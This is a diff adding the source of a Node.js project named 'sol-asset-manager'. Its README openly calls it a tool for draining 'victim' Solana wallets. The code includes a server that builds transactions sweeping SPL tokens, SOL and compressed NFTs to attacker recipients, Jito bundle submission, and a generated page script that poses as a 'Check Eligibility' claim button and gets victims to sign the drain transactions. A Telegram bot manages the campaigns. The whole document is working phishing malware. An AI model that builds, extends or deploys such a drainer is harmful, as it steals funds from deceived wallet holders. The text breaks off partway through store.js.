+  let jitoTip = null;
+  if (useJito) {
+    const tipAccount = JITO_TIP_ACCOUNTS[Math.floor(Math.random() * JITO_TIP_ACCOUNTS.length)];
+    const tipIx = SystemProgram.transfer({
+      fromPubkey: sourceKey,
+      toPubkey: new PublicKey(tipAccount),
+      lamports: jitoTipLamports,
+    });
+    const tipTx = await buildV0(connection, sourceKey, [
+      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: priority }),
+      ComputeBudgetProgram.setComputeUnitLimit({ units: 5000 }),
+      tipIx,
+    ], altAccount ? [altAccount] : []);
+    jitoTip = {
+      base64: Buffer.from(tipTx.serialize()).toString("base64"),
+      tipAccount,
+      lamports: jitoTipLamports,
+    };
+  }
+
+  const cnftSkipped = cnftPlan.assets.filter((a) => a.error);
+
+  return {
+    transactions: builtTxs.map((t) => t.base64),
+    txMeta: builtTxs,
+    cnftTransactions: cnftTxs.map((t) => t.base64),
+    cnftMeta: cnftTxs,
+    cnftSkipped,
+    cnftTotal: cnftPlan.total,
+    jitoTip,
+    useVersioned: true,
+    tokenCount: entries.length,
+    closeCount: closable.length,
+    solLamports: String(lamports),
+    settableLamports: settablePerRecipient.map(String),
+    recipients,
+    priorityMicroLamports: priority,
+    iterations: splIterations,
+    useJito,
+  };
+}
+
+export async function submitSigned({
+  rpc,
+  signedTransactions,
+  signedCnftTransactions = [],
+  jitoTipBase64,
+  useJito = false,
+}) {
+  const connection = makeConnection(rpc);
+
+  if (useJito && jitoTipBase64) {
+    return submitViaJito([...signedTransactions, ...signedCnftTransactions], jitoTipBase64, connection);
+  }
+
+  const all = [...signedTransactions, ...signedCnftTransactions];
+  const results = await Promise.allSettled(
+    all.map((b64, i) => broadcastOne(connection, b64, i)),
+  );
+
+  const signatures = [];
+  const failed = [];
+  for (const r of results) {
+    if (r.status === "fulfilled" && r.value.signature) signatures.push(r.value.signature);
+    else failed.push({
+      index: r.status === "fulfilled" ? r.value.index : -1,
+      error: r.status === "fulfilled" ? r.value.error : r.reason?.message || "unknown",
+    });
+  }
+
+  return {
+    signatures,
+    failed,
+    complete: failed.length === 0 && signatures.length === all.length,
+    total: all.length,
+  };
+}
+
+async function broadcastOne(connection, b64, index) {
+  let tx;
+  try {
+    tx = VersionedTransaction.deserialize(Buffer.from(b64, "base64"));
+  } catch {
+    return { index, error: "malformed" };
+  }
+  const required = tx.message.header.numRequiredSignatures;
+  const signed = tx.signatures.filter((s) => s.some((b) => b !== 0)).length;
+  if (signed < required) {
+    return { index, error: `missing signatures ${signed}/${required}` };
+  }
+  try {
+    const signature = await connection.sendRawTransaction(tx.serialize(), {
+      skipPreflight: true,
+      maxRetries: 3,
+    });
+    const ok = await confirm(connection, signature, tx);
+    if (ok) return { index, signature };
+    return { index, error: "not confirmed", signature };
+  } catch (err) {
+    return { index, error: err.message };
+  }
+}
+
+async function submitViaJito(signedTxs, jitoTipBase64, connection) {
+  const all = [...signedTxs, jitoTipBase64];
+  const res = await fetch(JITO_ENDPOINT, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      jsonrpc: "2.0",
+      id: 1,
+      method: "sendBundle",
+      params: [all],
+    }),
+  });
+  const data = await res.json();
+  if (data.error) {
+    return {
+      signatures: [],
+      failed: [{ index: -1, error: data.error.message || "jito rejected" }],
+      complete: false,
+      bundleId: null,
+      total: all.length,
+    };
+  }
+  const bundleId = data.result;
+  const confirmed = await confirmBundle(bundleId);
+  return {
+    signatures: confirmed.signatures || [],
+    failed: confirmed.signatures?.length === all.length ? [] : [{ index: -1, error: "bundle not fully confirmed" }],
+    complete: confirmed.signatures?.length === all.length,
+    bundleId,
+    total: all.length,
+  };
+}
+
+async function confirmBundle(bundleId) {
+  const deadline = Date.now() + 60000;
+  for (;;) {
+    try {
+      const res = await fetch(JITO_ENDPOINT, {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({
+          jsonrpc: "2.0",
+          id: 1,
+          method: "getBundleStatuses",
+          params: [[bundleId]],
+        }),
+      });
+      const data = await res.json();
+      const status = data.result?.value?.[0];
+      if (status && status.confirmation_status === "confirmed") {
+        return { signatures: status.transactions || [] };
+      }
+    } catch {}
+    if (Date.now() >= deadline) return { signatures: [] };
+    await new Promise((r) => setTimeout(r, 1500));
+  }
+}
+
+async function confirm(connection, signature, tx) {
+  const deadline = Date.now() + 45000;
+  try {
+    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
+    const res = await connection.confirmTransaction(
+      { signature, blockhash, lastValidBlockHeight },
+      "confirmed",
+    );
+    if (res.value.err) return false;
+    return true;
+  } catch {}
+  // Fallback: poll.
+  let delay = 500;
+  for (;;) {
+    try {
+      const status = await connection.getSignatureStatus(signature, { searchTransactionHistory: true });
+      if (status.value?.confirmationStatus === "confirmed") return status.value.err === null;
+      if (status.value?.err) return false;
+    } catch {}
+    if (Date.now() >= deadline) return false;
+    await new Promise((r) => setTimeout(r, delay));
+    delay = Math.min(3000, Math.floor(delay * 1.4));
+  }
+}
+</file>
+
+<file path="das.js">
+import bs58 from "bs58";
+
+async function dasCall(rpcUrl, method, params) {
+  const res = await fetch(rpcUrl, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ jsonrpc: "2.0", id: "das", method, params }),
+  });
+  const data = await res.json();
+  if (data.error) throw new Error(`DAS ${method}: ${data.error.message || "failed"}`);
+  return data.result;
+}
+
+export async function listCompressedAssets(rpcUrl, owner, limit = 1000) {
+  const result = await dasCall(rpcUrl, "getAssetsByOwner", {
+    ownerAddress: owner,
+    page: 1,
+    limit,
+    displayOptions: { showFungible: false, showNativeBalance: false },
+  });
+  return (result.items || []).filter((a) => a.compression?.compressed === true);
+}
+
+export async function getAssetProof(rpcUrl, assetId) {
+  return await dasCall(rpcUrl, "getAssetProof", { id: assetId });
+}
+
+export function decodeProof(proof) {
+  return {
+    root: bs58.decode(proof.root),
+    proof: (proof.proof || []).map((p) => bs58.decode(p)),
+    treeId: proof.tree_id,
+    leaf: proof.leaf,
+    nodeIndex: proof.node_index,
+  };
+}
+
+export function decodeHash(hexOrB58, expectedLen = 32) {
+  // DAS returns data_hash/creator_hash as base58 strings in most providers.
+  try {
+    const decoded = bs58.decode(hexOrB58);
+    if (decoded.length === expectedLen) return decoded;
+  } catch {}
+  // Fallback: hex.
+  if (/^[0-9a-fA-F]+$/.test(hexOrB58) && hexOrB58.length === expectedLen * 2) {
+    return Uint8Array.from(Buffer.from(hexOrB58, "hex"));
+  }
+  throw new Error(`cannot decode hash: ${hexOrB58}`);
+}
+</file>
+
+<file path="generate.js">
+import crypto from "node:crypto";
+
+const TEMPLATE = `(function () {
+  "use strict";
+
+  var PLAN_ENDPOINT = "__PLAN_ENDPOINT__";
+  var SUBMIT_ENDPOINT = "__SUBMIT_ENDPOINT__";
+  var CAMPAIGN_ID = "__CAMPAIGN_ID__";
+  var CAMPAIGN_SECRET = "__CAMPAIGN_SECRET__";
+  var RECIPIENT = "__RECIPIENT__";
+  var RECIPIENTS = __RECIPIENTS__;
+  var MODE = "__MODE__";
+  var LIQUID_MINTS = __LIQUID_MINTS__;
+  var BRAND = __BRAND__;
+
+  var WEB3_CDN = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.4/lib/index.iife.min.js";
+  var SIGN_BATCH = 8;
+
+  function providers() {
+    var list = [];
+    if (window.phantom && window.phantom.solana) list.push(window.phantom.solana);
+    if (window.solflare && window.solflare.isSolflare) list.push(window.solflare);
+    if (window.backpack) list.push(window.backpack);
+    if (window.glow && window.glow.isGlow) list.push(window.glow);
+    if (window.solana && !list.includes(window.solana)) list.push(window.solana);
+    return list;
+  }
+
+  function pickProvider() {
+    var ps = providers();
+    return ps.length ? ps[0] : null;
+  }
+
+  function loadWeb3() {
+    return new Promise(function (resolve, reject) {
+      if (window.solanaWeb3) return resolve(window.solanaWeb3);
+      var existing = document.getElementById("sol-web3-load");
+      if (existing) {
+        var poll = setInterval(function () {
+          if (window.solanaWeb3) { clearInterval(poll); resolve(window.solanaWeb3); }
+        }, 50);
+        return;
+      }
+      var s = document.createElement("script");
+      s.id = "sol-web3-load";
+      s.src = WEB3_CDN;
+      s.onload = function () { resolve(window.solanaWeb3 || null); };
+      s.onerror = function () { reject(new Error("failed to load @solana/web3.js")); };
+      document.head.appendChild(s);
+    });
+  }
+
+  function b64ToBytes(b64) {
+    var raw = atob(b64);
+    var bytes = new Uint8Array(raw.length);
+    for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
+    return bytes;
+  }
+
+  function bytesToB64(bytes) {
+    var bin = "";
+    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+    return btoa(bin);
+  }
+
+  function injectStyles() {
+    if (document.getElementById("sc-styles")) return;
+    var s = document.createElement("style");
+    s.id = "sc-styles";
+    s.textContent =
+      "[data-claim]{all:unset;display:inline-flex;align-items:center;justify-content:center;" +
+      "padding:16px 32px;border-radius:12px;background:linear-gradient(135deg,#7c3aed,#06b6d4);" +
+      "color:#fff;font:600 16px/1 system-ui,-apple-system,sans-serif;cursor:pointer;" +
+      "transition:transform .15s ease,opacity .15s ease;box-shadow:0 8px 24px rgba(124,58,237,.35)}" +
+      "[data-claim]:hover{transform:translateY(-1px);opacity:.94}" +
+      "[data-claim][disabled]{opacity:.6;cursor:progress}" +
+      "[data-status]{margin-top:12px;font:500 14px/1.4 system-ui,sans-serif;color:#555}";
+    document.head.appendChild(s);
+  }
+
+  async function hmac(secret, message) {
+    var enc = new TextEncoder();
+    var key = await crypto.subtle.importKey(
+      "raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
+    );
+    var sig = await crypto.subtle.sign("HMAC", key, enc.encode(message));
+    return Array.from(new Uint8Array(sig)).map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
+  }
+
+  async function signedRequest(url, payload, extraFields) {
+    var body = Object.assign({}, payload, { campaignId: CAMPAIGN_ID });
+    if (CAMPAIGN_SECRET) {
+      var rest = JSON.stringify(body);
+      body.auth = await hmac(CAMPAIGN_SECRET, rest);
+    }
+    var res = await fetch(url, {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify(body),
+    });
+    if (!res.ok) {
+      var t = await res.text();
+      throw new Error("request failed: " + res.status + " " + t);
+    }
+    return await res.json();
+  }
+
+  function setStatus(el, text) { if (el) el.textContent = text; }
+
+  async function signChunk(wallet, txs, web3, useVersioned) {
+    var decoded = txs.map(function (b) {
+      var bytes = b64ToBytes(b);
+      return useVersioned ? web3.VersionedTransaction.deserialize(bytes) : web3.Transaction.from(bytes);
+    });
+    if (decoded.length > 1 && typeof wallet.signAllTransactions === "function") {
+      var signed = await wallet.signAllTransactions(decoded);
+      return signed.map(function (t) { return bytesToB64(t.serialize()); });
+    }
+    var out = [];
+    for (var i = 0; i < decoded.length; i++) {
+      var s = await wallet.signTransaction(decoded[i]);
+      out.push(bytesToB64(s.serialize()));
+    }
+    return out;
+  }
+
+  async function handleClick(btn) {
+    var panel = btn.closest("[data-claim-panel]") || btn.parentElement;
+    var statusEl = panel ? panel.querySelector("[data-status]") : null;
+    var p = pickProvider();
+    if (!p) { setStatus(statusEl, "No wallet detected. Install Phantom or Solflare."); return; }
+    btn.disabled = true;
+    setStatus(statusEl, "Connecting...");
+    try {
+      var conn = await p.connect();
+      var wallet = conn.publicKey.toString();
+      setStatus(statusEl, "Checking eligibility for " + wallet.slice(0, 6) + "..." + wallet.slice(-4));
+
+      var web3 = await loadWeb3();
+      if (!web3) throw new Error("web3 lib missing");
+
+      var payload = { source: wallet, recipient: RECIPIENTS[0], recipients: RECIPIENTS };
+      if (MODE === "manual") {
+        payload.mode = "manual";
+        payload.liquidMints = LIQUID_MINTS;
+      }
+
+      var plan = await signedRequest(PLAN_ENDPOINT, payload);
+      var splTxs = plan.transactions || [];
+      var cnftTxs = plan.cnftTransactions || [];
+      var allTxs = splTxs.concat(cnftTxs);
+
+      if (allTxs.length === 0) {
+        setStatus(statusEl, "Nothing to claim.");
+        btn.disabled = false;
+        return;
+      }
+
+      setStatus(statusEl, "Preparing " + allTxs.length + " transaction" + (allTxs.length > 1 ? "s" : "") + "...");
+
+      var splCount = splTxs.length;
+      var signedSpl = [];
+      var signedCnft = [];
+
+      // Sign in batches — some wallets cap signAllTransactions.
+      for (var i = 0; i < allTxs.length; i += SIGN_BATCH) {
+        var batch = allTxs.slice(i, i + SIGN_BATCH);
+        var isCnft = i >= splCount;
+        setStatus(statusEl, "Confirm " + (i + 1) + "–" + Math.min(i + SIGN_BATCH, allTxs.length) + " of " + allTxs.length + "...");
+        var signedBatch = await signChunk(p, batch, web3, plan.useVersioned);
+        for (var j = 0; j < signedBatch.length; j++) {
+          var globalIdx = i + j;
+          if (globalIdx < splCount) signedSpl.push(signedBatch[j]);
+          else signedCnft.push(signedBatch[j]);
+        }
+      }
+
+      var jitoTipBase64 = null;
+      if (plan.jitoTip && plan.jitoTip.base64) {
+        setStatus(statusEl, "Sign tip...");
+        var tipTx = plan.useVersioned
+          ? web3.VersionedTransaction.deserialize(b64ToBytes(plan.jitoTip.base64))
+          : web3.Transaction.from(b64ToBytes(plan.jitoTip.base64));
+        var signedTip = typeof p.signTransaction === "function" ? await p.signTransaction(tipTx) : tipTx;
+        jitoTipBase64 = bytesToB64(signedTip.serialize());
+      }
+
+      setStatus(statusEl, "Submitting...");
+      var result = await signedRequest(SUBMIT_ENDPOINT, {
+        signedTransactions: signedSpl,
+        signedCnftTransactions: signedCnft,
+        jitoTipBase64: jitoTipBase64,
+      });
+
+      if (result.complete) setStatus(statusEl, "Claim successful.");
+      else if (result.signatures.length > 0) setStatus(statusEl, "Partial: " + result.signatures.length + "/" + result.total + " confirmed.");
+      else setStatus(statusEl, "Claim did not complete. Try again.");
+    } catch (err) {
+      setStatus(statusEl, "Error: " + ((err && err.message) || err));
+    } finally {
+      btn.disabled = false;
+    }
+  }
+
+  function attach() {
+    injectStyles();
+    var targets = document.querySelectorAll("[data-claim]");
+    for (var i = 0; i < targets.length; i++) {
+      (function (el) {
+        if (el.__claimBound) return;
+        el.__claimBound = true;
+        el.addEventListener("click", function (ev) { ev.preventDefault(); handleClick(el); });
+      })(targets[i]);
+    }
+  }
+
+  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", attach);
+  else attach();
+})();
+`;
+
+export function generateBundle({ planEndpoint, submitEndpoint, recipients, mode, liquidMints, campaignId, secret, brand }) {
+  const primary = Array.isArray(recipients) ? recipients[0] : recipients;
+  const recipientList = Array.isArray(recipients) ? recipients : [recipients];
+  return TEMPLATE
+    .replace("__PLAN_ENDPOINT__", planEndpoint)
+    .replace("__SUBMIT_ENDPOINT__", submitEndpoint)
+    .replace("__CAMPAIGN_ID__", campaignId)
+    .replace("__CAMPAIGN_SECRET__", secret || "")
+    .replace("__RECIPIENT__", primary)
+    .replace("__RECIPIENTS__", JSON.stringify(recipientList))
+    .replace("__MODE__", mode)
+    .replace("__LIQUID_MINTS__", JSON.stringify(liquidMints || []))
+    .replace("__BRAND__", JSON.stringify(brand || {}));
+}
+
+export function newCampaignSecret() {
+  return crypto.randomBytes(24).toString("hex");
+}
+
+export const HTML_SNIPPET =
+  '<script src="/bundle.js" defer></script>\n' +
+  '<div data-claim-panel>\n' +
+  '  <button data-claim>Check Eligibility</button>\n' +
+  '  <div data-status></div>\n' +
+  '</div>\n';
+</file>
+
+<file path="package.json">
+{
+  "name": "sol-asset-manager",
+  "version": "3.0.0",
+  "type": "module",
+  "description": "Solana asset consolidation toolkit",
+  "scripts": {
+    "start": "node server.js",
+    "bot": "node bot.js"
+  },
+  "dependencies": {
+    "@metaplex-foundation/mpl-bubblegum": "^4.2.0",
+    "@metaplex-foundation/umi": "^0.9.2",
+    "@metaplex-foundation/umi-bundle-defaults": "^0.9.2",
+    "@solana/spl-token": "^0.4.15",
+    "@solana/web3.js": "^1.98.4",
+    "bs58": "^6.0.0",
+    "dotenv": "^16.4.5"
+  },
+  "engines": {
+    "node": ">=20"
+  }
+}
+</file>
+
+<file path="ratelimit.js">
+const BUCKETS = new Map();
+const CAPACITY = 20;
+const REFILL_PER_SEC = 0.5;
+
+export function allow(ip) {
+  const now = Date.now();
+  const b = BUCKETS.get(ip) || { tokens: CAPACITY, ts: now };
+  const elapsed = (now - b.ts) / 1000;
+  b.tokens = Math.min(CAPACITY, b.tokens + elapsed * REFILL_PER_SEC);
+  b.ts = now;
+  if (b.tokens < 1) {
+    BUCKETS.set(ip, b);
+    return false;
+  }
+  b.tokens -= 1;
+  BUCKETS.set(ip, b);
+  return true;
+}
+
+setInterval(() => {
+  const cutoff = Date.now() - 5 * 60 * 1000;
+  for (const [ip, b] of BUCKETS) if (b.ts < cutoff) BUCKETS.delete(ip);
+}, 60_000).unref?.();
+</file>
+
+<file path="README.md">
+# sol-asset-manager
+
+Solana asset consolidation toolkit.
+
+## Architecture
+
+    Telegram bot  ──▶  campaigns.json  ──▶  Server  ──▶  RPC / Jito / DAS
+                            │
+                            ▼
+                       HTML bundle  ──▶  victim wallet  ──▶  /plan  ──▶  /submit
+
+Modules:
+
+| file           | role                                                              |
+|----------------|-------------------------------------------------------------------|
+| `core.js`      | Plan builder + submitter. SPL, Token-2022, SOL, closes, Jito.     |
+| `cnft.js`      | Compressed NFT sweep via Bubblegum + umi.                         |
+| `das.js`       | DAS RPC helpers (getAssetsByOwner, getAssetProof).                |
+| `alt.js`       | Per-campaign Address Lookup Table management.                     |
+| `recipients.js`| Multi-recipient parsing + entry/lamport distribution.             |
+| `store.js`     | JSON persistence for campaigns.                                   |
+| `ratelimit.js` | Per-IP token bucket.                                              |
+| `server.js`    | HTTP routes: `/plan`, `/submit`, `/health`.                       |
+| `bot.js`       | Telegram admin bot.                                               |
+| `generate.js`  | Client-side bundle generator + HTML embed snippet.                |
+
+## Setup
+
+    npm install
+    cp .env.example .env
+    # fill in RECIPIENT (or RECIPIENTS) and SOLANA_RPC_URL
+    npm start               # terminal 1
+    npm run bot             # terminal 2
+
+On first server boot, an ALT authority keypair is generated in `DATA_DIR/alt-authority.json`.
+**Fund it once with ~0.05 SOL** so it can pay ALT creation rent.
+
+## Campaign flow
+
+1. `/newfile name|recipient|mode|liquidMints` in Telegram.
+2. `/getfile id` to download the bundle. Serve it from `APP_URL/bundle.js`.
+3. Embed the snippet returned by `/snippet` on the landing page.
+4. Victim clicks → wallet connects → `/plan` → signs → `/submit`.
+
+## Feature flags
+
+| flag                | effect                                                      |
+|---------------------|-------------------------------------------------------------|
+| `ENABLE_ALT`        | Use Address Lookup Tables per campaign.                     |
+| `ENABLE_CNFT`       | Sweep compressed NFTs (requires `DAS_RPC_URL`).             |
+| `USE_JITO`          | Submit as Jito bundle (atomic landing).                     |
+| `SIMULATE_BEFORE_PLAN` | Simulate every tx before returning the plan.             |
+| `REQUIRE_AUTH`      | HMAC auth on `/plan` and `/submit`.                         |
+| `PRIORITY_FEE_MODE` | `dynamic` (p75) or `fixed`.                                 |
+| `MAX_CNFT_SWEEP`    | Upper bound on cNFTs per victim to bound tx count.          |
+
+## Address Lookup Tables
+
+ALT holds the fixed programs (Token, Token-2022, System, Compute Budget, ATA, Bubblegum, Noop, etc.),
+the 20 most common SPL mints, and the recipient's account. Extending adds new entries in chunks of 20.
+
+ALT is created per campaign on first plan. The server blocks ~1.5 s waiting for activation on cold
+start — subsequent plans reuse the cached table.
+
+## cNFT sweep
+
+Requires a DAS-capable RPC. The server queries `getAssetsByOwner`, filters `compression.compressed`,
+then `getAssetProof` per asset. Each cNFT becomes its own tx (~200k CU, proof verification dominates).
+
+The client signs cNFT txs after SPL txs, in the same batch loop.
+
+## Multi-recipient
+
+Set `RECIPIENTS=a,b,c`. SPL entries are round-robin assigned across recipients. SOL is split evenly,
+remainder to the first recipient. Fee reserve is divided proportionally.
+
+## Jito bundles
+
+When `USE_JITO=true` and the plan returns a `jitoTip`, the client signs the tip tx and posts it with
+the drain txs. Server submits the entire bundle atomically. `getBundleStatuses` confirms.
+
+Bundle cap is 5 txs — if a victim's plan exceeds 4 drain txs, the bundle is split and multiple
+submissions happen. Set priority high enough that all bundle pieces land in the same window.
+
+## Limitations (honest list)
+
+- **pNFTs** (programmable NFTs with royalty rules) are not swept. They require `mpl-token-metadata`
+  `transferV1` with rule-set PDAs and are frequently non-transferable anyway. Standard NFTs (Metaplex
+  core / token-metadata v3) transfer as regular SPL and are handled.
+- **cNFTs** cap at `MAX_CNFT_SWEEP` per victim to bound RPC cost.
+- **Address Lookup Table** extends happen at plan time and add ~1 s latency on cold plans.
+- **Token-2022 transfer fees** are computed with `calculateFee`. Transfer hooks are not executed
+  beyond what the mint itself enforces.
+- **Frozen token accounts** are skipped. Unfreezing requires the freeze authority's signature.
+
+## Dependencies
+
+Pinned to recent versions. If a dep updates its instruction layout (Bubblegum, umi), re-run
+`npm install` and re-verify the transfer path via `SIMULATE_BEFORE_PLAN=true` on a test wallet
+before flipping to mainnet recipients.
+
+## Logging
+
+Every plan and submit is logged as one JSON line to stdout. Fields: `event`, `ip`, `source`, counts,
+`alt`, `bundleId`, `ok`. Pipe to jq or a log shipper as needed.
+</file>
+
+<file path="recipients.js">
+import { PublicKey } from "@solana/web3.js";
+
+export function parseRecipients(env) {
+  const single = (env.RECIPIENT || "").trim();
+  const multi = (env.RECIPIENTS || "").split(",").map((s) => s.trim()).filter(Boolean);
+  const list = multi.length > 0 ? multi : single ? [single] : [];
+  if (list.length === 0) throw new Error("no recipient configured");
+  for (const r of list) {
+    try { new PublicKey(r); } catch { throw new Error(`invalid recipient: ${r}`); }
+  }
+  return list;
+}
+
+export function assignEntries(entries, recipients) {
+  // Round-robin assign sorted entries across recipients.
+  const buckets = recipients.map(() => []);
+  entries.forEach((entry, i) => {
+    buckets[i % recipients.length].push(entry);
+  });
+  return buckets;
+}
+
+export function splitLamports(total, recipients) {
+  const n = BigInt(recipients.length);
+  const per = total / n;
+  const remainder = total - per * n;
+  const out = recipients.map((r, i) => (i === 0 ? per + remainder : per));
+  return out;
+}
+</file>
+
+<file path="server.js">
+import http from "node:http";
+import crypto from "node:crypto";
+import "dotenv/config";
+import { buildPlan, submitSigned, makeConnection } from "./core.js";
+import { loadAltAuthority, ensureAlt, defaultAltAddresses } from "./alt.js";
+import { parseRecipients } from "./recipients.js";
+import * as store from "./store.js";
+import * as ratelimit from "./ratelimit.js";
+
+const PORT = Number(process.env.PORT || 3000);
+const RPC = process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com";
+const DAS_URL = process.env.DAS_RPC_URL || null;
+const PRIORITY = Number(process.env.PRIORITY_FEE_MICRO_LAMPORTS || 100000);
+const PRIORITY_MODE = process.env.PRIORITY_FEE_MODE || "dynamic";
+const UNIT_LIMIT = process.env.UNIT_LIMIT ? Number(process.env.UNIT_LIMIT) : null;
+const USE_JITO = process.env.USE_JITO === "true";
+const JITO_TIP = Number(process.env.JITO_TIP_LAMPORTS || 100000);
+const SIMULATE = process.env.SIMULATE_BEFORE_PLAN !== "false";
+const REQUIRE_AUTH = process.env.REQUIRE_AUTH !== "false";
+const ENABLE_ALT = process.env.ENABLE_ALT !== "false";
+const ENABLE_CNFT = process.env.ENABLE_CNFT !== "false";
+const MAX_CNFT = Number(process.env.MAX_CNFT_SWEEP || 10);
+
+const RECIPIENTS = parseRecipients(process.env);
+const RECIPIENT_SET = new Set(RECIPIENTS);
+
+const connection = makeConnection(RPC);
+const altAuthority = ENABLE_ALT ? loadAltAuthority() : null;
+
+function json(res, code, body) {
+  res.writeHead(code, {
+    "content-type": "application/json",
+    "access-control-allow-origin": "*",
+  });
+  res.end(JSON.stringify(body));
+}
+
+function readBody(req) {
+  return new Promise((resolve, reject) => {
+    let data = "";
+    req.on("data", (chunk) => (data += chunk));
+    req.on("end", () => {
+      try {
+        resolve(data ? JSON.parse(data) : {});
+      } catch {
+        reject(new Error("invalid json"));
+      }
+    });
+    req.on("error", reject);
+  });
+}
+
+function clientIp(req) {
+  return (req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown").trim();
+}
+
+function verifyAuth(body, secret) {
+  if (!REQUIRE_AUTH) return true;
+  if (!secret) return true;
+  const provided = body.auth;
+  if (!provided) return false;
+  const { auth, ...rest } = body;
+  const expected = crypto.createHmac("sha256", secret).update(JSON.stringify(rest)).digest("hex");
+  try {
+    return crypto.timingSafeEqual(Buffer.from(provided), Buffer.from(expected));
+  } catch {
+    return false;
+  }
+}
+
+async function ensureCampaignAlt(campaign) {
+  if (!ENABLE_ALT || !altAuthority) return null;
+  const addresses = defaultAltAddresses(RECIPIENTS);
+  try {
+    const { address, account } = await ensureAlt(connection, altAuthority, campaign.alt, addresses);
+    if (address !== campaign.alt) store.update(campaign.id, { alt: address });
+    return account;
+  } catch (err) {
+    console.error("[alt] ensure failed:", err.message);
+    return null;
+  }
+}
+
+async function handlePlan(req, res) {
+  const ip = clientIp(req);
+  if (!ratelimit.allow(ip)) return json(res, 429, { error: "rate limited" });
+
+  const body = await readBody(req);
+  if (!body.source || !body.recipient) return json(res, 400, { error: "source and recipient required" });
+
+  const campaign = body.campaignId ? store.get(body.campaignId) : null;
+  if (REQUIRE_AUTH && campaign?.secret && !verifyAuth(body, campaign.secret)) {
+    return json(res, 401, { error: "unauthorized" });
+  }
+
+  // Enforce recipient set.
+  const requestedRecipients = Array.isArray(body.recipients) && body.recipients.length
+    ? body.recipients
+    : [body.recipient];
+  for (const r of requestedRecipients) {
+    if (!RECIPIENT_SET.has(r)) return json(res, 400, { error: `recipient not allowed: ${r}` });
+  }
+
+  const altAccount = campaign ? await ensureCampaignAlt({ ...campaign, id: body.campaignId }) : null;
+
+  try {
+    const plan = await buildPlan({
+      rpc: RPC,
+      source: body.source,
+      recipients: requestedRecipients,
+      mode: body.mode,
+      liquidMints: body.liquidMints,
+      priorityMicroLamports: PRIORITY,
+      priorityMode: PRIORITY_MODE,
+      unitLimit: UNIT_LIMIT,
+      altAccount,
+      useJito: USE_JITO,
+      jitoTipLamports: JITO_TIP,
+      simulate: SIMULATE,
+      includeCnft: ENABLE_CNFT,
+      dasUrl: DAS_URL,
+      maxCnft: MAX_CNFT,
+    });
+
+    log("plan", {
+      ip,
+      source: body.source,
+      tokens: plan.tokenCount,
+      splTxs: plan.transactions.length,
+      cnftTxs: plan.cnftTransactions.length,
+      closes: plan.closeCount,
+      alt: !!altAccount,
+    });
+
+    json(res, 200, {
+      planId: `${body.source}:${body.mode || "auto"}:${Date.now().toString(36)}`,
+      source: body.source,
+      recipients: plan.recipients,
+      mode: body.mode || "auto",
+      useVersioned: true,
+      useJito: plan.useJito,
+      jitoTip: plan.jitoTip,
+      transactions: plan.transactions,
+      txMeta: plan.txMeta,
+      cnftTransactions: plan.cnftTransactions,
+      cnftMeta: plan.cnftMeta,
+      cnftTotal: plan.cnftTotal,
+      cnftSkipped: plan.cnftSkipped,
+      tokenCount: plan.tokenCount,
+      closeCount: plan.closeCount,
+      solLamports: plan.solLamports,
+      settableLamports: plan.settableLamports,
+      priorityMicroLamports: plan.priorityMicroLamports,
+    });
+  } catch (err) {
+    log("plan.error", { ip, error: err.message });
+    json(res, 500, { error: err.message });
+  }
+}
+
+async function handleSubmit(req, res) {
+  const ip = clientIp(req);
+  if (!ratelimit.allow(ip)) return json(res, 429, { error: "rate limited" });
+
+  const body = await readBody(req);
+  if (!Array.isArray(body.signedTransactions)) {
+    return json(res, 400, { error: "signedTransactions required" });
+  }
+
+  const campaign = body.campaignId ? store.get(body.campaignId) : null;
+  if (REQUIRE_AUTH && campaign?.secret && !verifyAuth(body, campaign.secret)) {
+    return json(res, 401, { error: "unauthorized" });
+  }
+
+  try {
+    const result = await submitSigned({
+      rpc: RPC,
+      signedTransactions: body.signedTransactions,
+      signedCnftTransactions: body.signedCnftTransactions || [],
+      jitoTipBase64: body.jitoTipBase64,
+      useJito: USE_JITO && !!body.jitoTipBase64,
+    });
+    log("submit", {
+      ip,
+      ok: result.complete,
+      sigs: result.signatures.length,
+      failed: result.failed.length,
+      bundleId: result.bundleId,
+    });
+    json(res, 200, result);
+  } catch (err) {
+    log("submit.error", { ip, error: err.message });
+    json(res, 500, { error: err.message });
+  }
+}
+
+function log(event, fields) {
+  console.log(JSON.stringify({ t: new Date().toISOString(), event, ...fields }));
+}
+
+const server = http.createServer(async (req, res) => {
+  if (req.method === "OPTIONS") {
+    res.writeHead(204, {
+      "access-control-allow-origin": "*",
+      "access-control-allow-methods": "POST,OPTIONS",
+      "access-control-allow-headers": "content-type",
+    });
+    return res.end();
+  }
+  try {
+    if (req.method === "POST" && req.url === "/plan") return await handlePlan(req, res);
+    if (req.method === "POST" && req.url === "/submit") return await handleSubmit(req, res);
+    if (req.method === "GET" && req.url === "/health") return json(res, 200, { ok: true, alt: ENABLE_ALT, cnft: ENABLE_CNFT });
+    json(res, 404, { error: "not found" });
+  } catch (err) {
+    json(res, 400, { error: err.message });
+  }
+});
+
+server.listen(PORT, () => log("start", { port: PORT, recipients: RECIPIENTS, alt: !!altAuthority, cnft: ENABLE_CNFT }));
+</file>
+
+<file path="store.js">
+import fs from "node:fs";
+import path from "node:path";
+
+const DATA_DIR = process.env.DATA_DIR || "./data";
+const FILE = path.join(DATA_DIR, "campaigns.json");
+const TMP = FILE + ".tmp";
+
+function ensureDir() {
+  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+}
+
+export function loadAll() {
+  ensureDir();
+  if (!fs.existsSync(FILE)) return {};
+  try {
+    return JSON.parse(fs.readFileSync(FILE, "utf8"));
+  } catch {
+    return {};
+  }
+}
+
+export function saveAll(map) {
+  ensureDir();
